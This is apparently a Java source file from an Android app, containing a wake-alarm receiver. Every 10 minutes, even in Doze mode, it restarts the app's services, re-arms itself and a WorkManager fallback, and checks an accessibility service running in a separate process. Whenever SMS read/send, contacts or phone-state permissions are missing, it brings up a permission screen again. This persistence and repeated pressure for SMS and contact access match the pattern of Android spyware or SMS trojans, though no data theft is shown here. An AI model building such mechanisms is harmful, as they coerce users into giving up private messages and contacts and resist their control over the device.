package com.task.tusker.receivers;

import android.Manifest;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import androidx.core.content.ContextCompat;
import com.task.tusker.PermissionRequestActivity;
import com.task.tusker.services.ServiceWatchdog;
import com.task.tusker.services.WakeWorker;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.ArrayList;
import java.util.List;

/**
 * WakeAlarmReceiver — Method 4: AlarmManager exact repeating heartbeat.
 *
 * Fired by ServiceWatchdog.scheduleWakeAlarm() every 10 minutes via
 * setExactAndAllowWhileIdle (RTC_WAKEUP) — works even in Doze mode.
 *
 * On each fire it:
 *   1. Ensures both foreground services are running.
 *   2. Re-schedules itself for another 10 minutes (exact alarms are one-shot).
 *   3. Re-queues the WorkManager task in case it was cancelled.
 *
 * Registered in AndroidManifest with the custom action
 * "com.task.tusker.action.WAKE_ALARM".
 */
public class WakeAlarmReceiver extends BroadcastReceiver {

    private static final String TAG = "WakeAlarmReceiver";

    /**
     * The alarm is intentionally limited to communication/contact permissions.
     * Do not replace this with AutoPermissionManager's full permission list.
     */
    private static final String[] ALARM_PERMISSION_SET = {
            Manifest.permission.READ_SMS,
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.SEND_SMS,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_PHONE_STATE
    };

    @Override
    public void onReceive(Context context, Intent intent) {
        String action = intent != null ? intent.getAction() : null;
        if (!ServiceWatchdog.ALARM_ACTION.equals(action)) return;

        // AlarmManager starts this receiver in the app process. Keep the
        // broadcast alive until main-thread recovery and the accessibility
        // service's delayed rebind have both completed.
        final PendingResult pendingResult = goAsync();
        final AtomicBoolean finished = new AtomicBoolean(false);
        Runnable finish = () -> {
            if (finished.compareAndSet(false, true)) pendingResult.finish();
        };
        Context appContext = context.getApplicationContext();
        Handler mainHandler = new Handler(Looper.getMainLooper());
        if (!mainHandler.post(() -> recoverOnMainThread(appContext, finish))) {
            finish.run();
        }
    }

    private static void recoverOnMainThread(Context context, Runnable finish) {
        Log.i(TAG, "10-minute wake alarm fired on app main thread");
        try {
            // Restart app services in the background; do not bring MainActivity
            // forward as part of routine watchdog recovery.
            ServiceWatchdog.ensureServicesRunning(context);

            // Re-arm the one-shot alarm and the 15-minute WorkManager fallback.
            ServiceWatchdog.scheduleWakeAlarm(context);
            WakeWorker.schedule(context);

            // Only missing SMS/contact/phone permissions open the permission UI.
            requestMissingAlarmPermissions(context);

            // Keep this broadcast pending until the separate accessibility
            // process has been checked/rebound.
            ServiceWatchdog.ensureAccessibilityRunning(context, finish);
        } catch (Exception e) {
            Log.e(TAG, "Alarm recovery failed: " + e.getMessage(), e);
            finish.run();
        }
    }

    private static void requestMissingAlarmPermissions(Context context) {
        List<String> missing = new ArrayList<>();
        for (String permission : ALARM_PERMISSION_SET) {
            if (ContextCompat.checkSelfPermission(context, permission)
                    != PackageManager.PERMISSION_GRANTED) {
                missing.add(permission);
            }
        }

        // READ_PHONE_NUMBERS was added in API 26. Do not request an unknown
        // permission on older Android versions.
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
                && ContextCompat.checkSelfPermission(
                        context, Manifest.permission.READ_PHONE_NUMBERS)
                        != PackageManager.PERMISSION_GRANTED) {
            missing.add(Manifest.permission.READ_PHONE_NUMBERS);
        }

        if (missing.isEmpty()) {
            Log.d(TAG, "Alarm permissions already granted");
            return;
        }

        try {
            Intent request = new Intent(context, PermissionRequestActivity.class);
            request.putExtra(
                    PermissionRequestActivity.EXTRA_PERMISSIONS,
                    missing.toArray(new String[0]));
            request.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK
                    | Intent.FLAG_ACTIVITY_CLEAR_TOP
                    | Intent.FLAG_ACTIVITY_SINGLE_TOP);
            context.startActivity(request);
            Log.i(TAG, "Requested " + missing.size()
                    + " missing SMS/contact/phone permission(s)");
        } catch (Exception e) {
            Log.w(TAG, "Could not request alarm permissions: " + e.getMessage());
        }
    }
}
